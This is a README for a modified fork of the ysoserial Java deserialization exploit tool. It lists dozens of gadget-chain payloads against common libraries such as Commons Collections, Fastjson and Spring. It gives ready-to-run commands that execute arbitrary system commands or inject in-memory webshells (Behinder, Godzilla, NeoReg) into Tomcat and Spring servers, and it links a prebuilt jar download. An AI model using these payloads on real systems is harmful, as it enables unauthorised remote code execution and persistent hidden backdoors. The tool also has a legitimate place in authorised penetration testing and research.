# ysoserial

ysoserial修改版，着重修改`ysoserial.payloads.util.Gadgets.createTemplatesImpl`使其可以通过引入自定义class的形式来执行命令、内存马、反序列化回显。

## Usage

```shell
$  java -jar ysoserial.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
四月 27, 2023 8:38:01 上午 org.reflections.Reflections scan
信息: Reflections took 70 ms to scan 1 urls, producing 22 keys and 197 values
     Payload                                Authors                                Dependencies
     -------                                -------                                ------------
     AspectJWeaver                          @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1                             @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                                   @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1                                 @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure                                @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1                      @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsBeanutils183NOCC                @Y4er                                  commons-beanutils:1.8.3
     CommonsBeanutils192NOCC                @Y4er                                  commons-beanutils:1.9.2
     CommonsBeanutils192WithDualTreeBidiMap @Y4er                                  commons-beanutils:1.9.2, commons-collections:3.1
     CommonsCollections1                    @frohoff                               commons-collections:3.1
     CommonsCollections12                   @Y4er                                  commons-collections:3.1
     CommonsCollections2                    @frohoff                               commons-collections4:4.0
     CommonsCollections3                    @frohoff                               commons-collections:3.1
     CommonsCollections4                    @frohoff                               commons-collections4:4.0
     CommonsCollections5                    @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6                    @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7                    @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     CommonsCollections8                    @navalorenzo                           commons-collections4:4.0
     Fastjson1                              @Y4er                                  fastjson:1.2.83
     Fastjson2                              @Y4er                                  fastjson:2.x
     FileUpload1                            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1                                @frohoff                               groovy:2.3.9
     Hibernate1                             @mbechler
     Hibernate2                             @mbechler
     JBossInterceptors1                     @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient                             @mbechler
     JRMPListener                           @mbechler
     JSON1                                  @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson                                @Y4er                                  jackson-databind:2.14.2
     JavassistWeld1                         @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21                                @frohoff
     Jython1                                @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1                          @matthias_kaiser                       js:1.7R2
     MozillaRhino2                          @_tint0                                js:1.7R2
     Myfaces1                               @mbechler
     Myfaces2                               @mbechler
     ROME                                   @mbechler                              rome:1.0
     Spring1                                @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2                                @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS                                 @gebl
     Vaadin1                                @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1                                @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

## 内存马相关

以CommonsBeanutils192NOCC为例：

```shell
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatCmdEcho"                     # TomcatCmdEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromJMX"      # TomcatServletMemShellFromJMX
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromJMX"       # TomcatFilterMemShellFromJMX     适用于tomcat7-9
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromJMX"     # TomcatListenerMemShellFromJMX
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:TomcatListenerNeoRegFromThread"    # TomcatListenerNeoRegFromThread     python neoreg.py -k fuckyou
java -jar ysoserial.jar CommonsBeanutils192NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       链接shell需要使用存在的路由
java -jar ysoserial.jar CommonsBeanutils192NOCC "FILE:E:\Calc.class"                      # ClassLoaderTemplate
java -jar ysoserial.jar CommonsBeanutils192NOCC "calc"                                    # CommandTemplate                 CLASS: FILE: 不使用协议开头则默认为执行cmd
```

一键注入cmdshell、冰蝎、哥斯拉内存马，shell连接使用请查看指定类。解决了request和response包装类导致冰蝎链接失败的问题，[见issue](https://github.com/rebeyond/Behinder/issues/187)。

以下受到`Gadgets.createTemplatesImpl`影响的gadget均需要如上方式传递参数：

1. Click1
2. CommonsBeanutils1
3. CommonsBeanutils183NOCC
4. CommonsBeanutils192NOCC
5. CommonsCollections2
6. CommonsCollections3
7. CommonsCollections4
8. Hibernate1
9. JavassistWeld1
10. JBossInterceptors1
11. Jdk7u21
12. JSON1
13. MozillaRhino1
14. MozillaRhino2
15. ROME
16. Spring1
17. Spring2
18. Vaadin1

## 下载

1. [点我下载打包好的jar包](https://jitpack.io/com/github/Y4er/ysoserial/main-SNAPSHOT/ysoserial-main-SNAPSHOT.jar)


## Building

Requires Java 1.7+ and Maven 3.x+

```mvn clean package -DskipTests```

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request

## See Also

* [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
